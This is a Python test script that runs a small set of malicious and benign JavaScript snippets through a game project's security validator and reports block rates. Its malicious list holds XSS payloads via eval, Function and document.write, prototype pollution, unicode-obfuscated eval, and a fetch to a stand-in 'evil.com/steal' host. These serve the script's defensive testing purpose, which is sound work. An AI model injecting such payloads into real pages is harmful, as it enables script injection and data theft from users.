#!/usr/bin/env python3
"""
Quick Security Test Runner
=========================

A simple script to quickly test the security validation with a few key attack vectors.
"""

import sys
import os

# Add the app directory to the path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from app import EnhancedSecurityValidator
except ImportError:
    print("❌ Could not import EnhancedSecurityValidator")
    print("Make sure you're in the PhaserGame directory")
    sys.exit(1)

def quick_security_test():
    """Run a quick security test with the most critical attack vectors"""
    validator = EnhancedSecurityValidator()
    
    print("🔒 Quick Security Validation Test")
    print("=" * 40)
    
    # Critical attack vectors
    malicious_tests = [
        ("Direct eval", 'eval("alert(\\"XSS\\")")'),
        ("Function constructor", 'new Function("alert(\\"XSS\\")")()'),
        ("setTimeout string", 'setTimeout("alert(\\"XSS\\")", 1000)'),
        ("Document.write", 'document.write("<script>alert(\\"XSS\\")</script>")'),
        ("Prototype pollution", 'Object.prototype.isAdmin = true'),
        ("Window.location", 'window.location = "http://evil.com"'),
        ("Fetch request", 'fetch("http://evil.com/steal")'),
        ("Unicode obfuscation", '\\u0065\\u0076\\u0061\\u006c("alert(1)")'),
    ]
    
    # Benign code that should pass
    benign_tests = [
        ("Function declaration", 'function test() { return 42; }'),
        ("Phaser game", 'var game = new Phaser.Game({width: 800, height: 600});'),
        ("Safe setTimeout", 'setTimeout(function() { console.log("safe"); }, 1000)'),
        ("Math operations", 'var result = Math.sqrt(25);'),
    ]
    
    print("\n🚨 Testing Malicious Code (should be BLOCKED):")
    malicious_blocked = 0
    for name, code in malicious_tests:
        result = validator.validate(code)
        is_blocked = not result['is_safe']
        status = "✅ BLOCKED" if is_blocked else "❌ ALLOWED (CRITICAL!)"
        print(f"   {status} - {name}")
        if is_blocked:
            malicious_blocked += 1
        else:
            print(f"      ⚠️  SECURITY GAP: {code[:50]}...")
    
    print(f"\n✅ Testing Benign Code (should be ALLOWED):")
    benign_allowed = 0
    for name, code in benign_tests:
        result = validator.validate(code)
        is_allowed = result['is_safe']
        status = "✅ ALLOWED" if is_allowed else "❌ BLOCKED (False Positive)"
        print(f"   {status} - {name}")
        if is_allowed:
            benign_allowed += 1
        else:
            print(f"      ⚠️  FALSE POSITIVE: {result['violations']}")
    
    print(f"\n📊 RESULTS:")
    print(f"   Malicious Code Blocked: {malicious_blocked}/{len(malicious_tests)} ({malicious_blocked/len(malicious_tests)*100:.1f}%)")
    print(f"   Benign Code Allowed: {benign_allowed}/{len(benign_tests)} ({benign_allowed/len(benign_tests)*100:.1f}%)")
    
    security_gaps = len(malicious_tests) - malicious_blocked
    false_positives = len(benign_tests) - benign_allowed
    
    if security_gaps == 0 and false_positives == 0:
        print(f"\n🎉 EXCELLENT: All tests passed!")
    elif security_gaps == 0:
        print(f"\n✅ GOOD: No security gaps, but {false_positives} false positive(s)")
    elif security_gaps > 0:
        print(f"\n🚨 WARNING: {security_gaps} critical security gap(s) detected!")
    
    return security_gaps == 0

if __name__ == "__main__":
    success = quick_security_test()
    if not success:
        print("\n❌ Security validation needs improvement!")
        sys.exit(1)
    else:
        print("\n✅ Security validation is working correctly!")
